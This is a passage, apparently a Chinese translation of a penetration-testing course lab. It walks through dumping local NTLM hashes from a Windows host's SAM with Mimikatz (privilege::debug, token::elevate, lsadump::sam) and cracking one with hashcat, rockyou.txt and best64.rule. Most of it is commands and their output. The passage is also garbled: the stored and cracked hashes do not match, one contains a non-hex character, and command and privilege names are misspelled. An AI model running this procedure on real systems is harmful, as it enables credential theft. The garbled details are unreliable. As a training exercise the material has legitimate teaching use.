
现在我们已经对 NTLM 哈希值是什么以及在哪里可以找到它们有了基本的了解，让我们演示如何获取并破解它们。

我们从 `192.168.50.210` 上的 `MARKETINGWK01` `SAM` 中提取密码。我们可以通过 `offsec` 上的 `RDP` 登录系统，并使用 `offsec` 作为密码。

我们将使用 `Get-LocalUser` 来检查系统上存在哪些用户。

```
PS C:\Users\offsec> Get-LocalUser
```

| Name | Description |
|---||---|
| Administrator | False 用于管理计算机/域的内置账户 |
| DefaultAccount | False 一个由系统管理的用户账户 |
| Guest | False 供访客访问计算机/域的内置账户 |
| nelly | True |
| offsec | True |
| WDAUUtilityAccount | 系统为 Windows 管理和使用的用户账户 |
| Defender Application scan... | | |

列表 290 - 在 PowerShell 中显示所有用户

列表 290 的输出表明 `MARKETINGWK01` 系统上存在另一个名为 `nelly` 的用户。我们此处的目标是通过检索 NTLM 哈希并破解它来获取 `nelly` 的明文密码。

我们已经知道用户在登录 Windows 系统时会存储凭据，但凭据也会以其他方式存储。例如，当使用用户账户运行服务时，凭据也会被存储。

我们将使用 `Mimikatz`（位于 `C:\mimikatz.exe`）来检查系统上存储的凭据。通过点击任务栏上的 Windows 图标并输入“powershell”，以管理员身份启动 PowerShell。我们将选择 Windows PowerShell 并如图所示点击“以管理员身份运行”。我们将点击“是”来确认用户账户控制 (`UAC`) 弹出窗口。

> 658 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/selfpersonateprivilege-secreatglobalprivilege

> 659 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser

![](img/987dc9f6ebd8893c565a1d124d7724e6_411_0.png)

图 218: 以管理员身份启动 PowerShell

在 PowerShell 窗口中，我们将切换到 `C:\tools` 并启动 `Mimikatz`。

```
PS C:\Windows\system32> cd C:\tools
```

```
PS C:\tools> ls
```

Directory: C:\tools

| Mode | LastWriteTime | Length Name |
| --- | --- | --- |
| -a---- | 5/31/2022 12:25 PM | 1355680 mimikatz.exe |

```
PS C:\tools> .\mimikatz.exe
```

```
#####
mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
## ^A ## #.
'A La Vie, A L'Amour 'gentilkiwi' (oeoo)
# # / \ # /*** Benjamin DELPY (benjamin.gentilki.com )
# # \ / /
> http://blog.gentilki.com/mimikatz
'### V \ V'
> (vincent.letoux@gmail.com)
'######'
> https://pingcastle.com /://mysmartlogon.com
mimikatz #
```

列表 291 - 启动 Mimikatz

根据程序，`Mimikatz` 正在运行，我们可以通过其命令行环境进入。每个命令由一个模块和一个由冒号分隔的命令组成，例如 `privilege::debug`。

我们可以使用各种命令从系统提取密码。`Mimikatz` 最常用的命令之一是 `sekurlsa::logpasswords`，它尝试从所有来源提取明文密码。由于这会产生大量输出，我们将改用 `lsadump::sam`，它从 `SAM` 中提取 NTLM 哈希。对于这种情况，我们必须先使用 `token::elevate` 提升到 `SYSTEM` 权限。

对于 `sekurlsa::logpasswords` 和 `lsadump::sam` 这两个命令，我们必须启用 `SeDePrivilege` 权限，我们将通过 `privilege::debug` 完成此操作。

```
mimikatz # privilege::debug

Privilege '20' OK
```

```
mimikatz # token::elevate

Token Id : 0

User name :
```

```
656 (00003e7) 1 D34811 AUTHORITY\SYSTEM S-1-18

(04g,2p) Primary* Impersonated* Token : (0000413a) 1 F46616 MARKETINGWK01\offsec S-1-21

(04g,2p) Primary* Thread : (0000d17) 1 D62216 AUTHORITY\SYSTEM S-1-18

(04g,2p) Primary* Impersonation (Delegation)
```

```
mimikatz # lsadump::sam

Domain : MARKETINGWK01

SysKey : a0e1557f9ce66dca1c2203d5

Local SID : S-1-21-42643930-22960531-33582470
```

```
RID : 00003e9 (0001)

User : offsec

Hash NTLM : d2cf8470a2eb3b052c
```

```
RID : 00003ea (0002)

User : nelly

Hash NTLM : e5fff3a627616fba0
```

列表 292 - 启用 SeDePrivilege 提升到 SYSTEM 并提取

输出显示我们成功启用了 `SeDePrivilege` 并获得了 `SYSTEM` 权限。`lsadump::sam` 的输出了两个 NTLM 哈希，一个针对 `offsec`，一个针对 `nelly`。由于我们知道 `offsec` 的 NTLM 哈希是从 "lab" 计算的，我们将跳过它并关注 `nelly` 的哈希。将 NTLM 哈希复制并粘贴到 `passwordattacks` 目录下的 `nelly.hash` 中。

```
kali@kali:~/passwordattacks$ cat nelly.hash

e5fff3a627616fba0
```

列表 293 - nelly.hash 中的用户 NTLM 哈希

接下来，我们从 `Hashcat` 的输出中检索缓存哈希。

```
kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"

5500 Netv1 / NetNTLM

2700 Netv1 / NetNTLM (NT)

5600 Netv2

27100 Netv2 (NT)

1000 NTLM
```

输出表明代码为 `1000`。

我们拥有开始破解 NTLM 哈希的所有内容。我们已经提取了哈希，因为 `Mimikatz` 输出的格式 `Hashcat` 接受。下一步是选择单词列表和规则文件。在本例中，我们使用 `rockyou.txt` 单词列表配合 `best64.rule` 文件，该文件包含 64 条有效规则。为 `hashcat` 提供所有参数以开始破解过程。

```
kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

hashcat (v6.2.5) starting

3ae85f0ffabb3a26772e16fiba10:nicole1

Session......: hashcat

Status.......: Cracked

Hash.Mode......: 1000 (NTLM)

Hash.Target......: 3ae85f0ffabb3a26772e16fiba10
```
